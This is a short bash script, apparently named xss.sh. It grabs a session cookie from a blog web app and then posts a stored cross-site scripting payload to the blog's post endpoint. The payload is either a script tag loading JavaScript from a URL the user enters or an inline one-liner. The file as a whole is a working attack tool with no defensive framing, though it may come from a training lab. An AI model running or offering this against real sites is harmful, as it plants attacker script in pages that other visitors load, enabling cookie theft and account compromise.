#!/bin/bash

if [[ "$1" == "" ]]; then
    echo "Usage: $(basename $0) url-to-blog"
    echo "E.g.: xss.sh http://server.org/app1"
    exit 1
fi

url="${1}"
echo "trying url ${url}/"

if curl -c ./cookies "${url}" > /dev/null 2>&1; then
  echo "Got session cookie."
else
  echo "Failed to get session cookie"
  exit 1
fi

url="${url}/blog"
echo -n "Name of the author: "
read author

echo -n "Do you want to [i]nclude a script or [w]rite one?"
read incWrite

case $incWrite in
  i|I)
    echo -n "Enter URL of JS to include: "
    read scrUrl
    code="<script type=\"text/javascript\" src=\"$scrUrl\"></script>"
    ;;

  w|W)
    echo -n "Enter a one-liner: "
    read scriptCode
    code="<script type=\"text/javascript\">$scriptCode</script>"
    ;;

 *)
   echo "Please enter i or w only."
   exit 1;
esac

echo "posting \"author=$author&content=$code\" to ${url}/post"
curl -b ./cookies --data "author=$author&content=$code" "${url}/post" > /dev/null 2>&1

if [[ "$?" == "0" ]]; then
  echo "Posted successfully"
else
  echo "Failed to post"
  exit 1
fi

exit 0

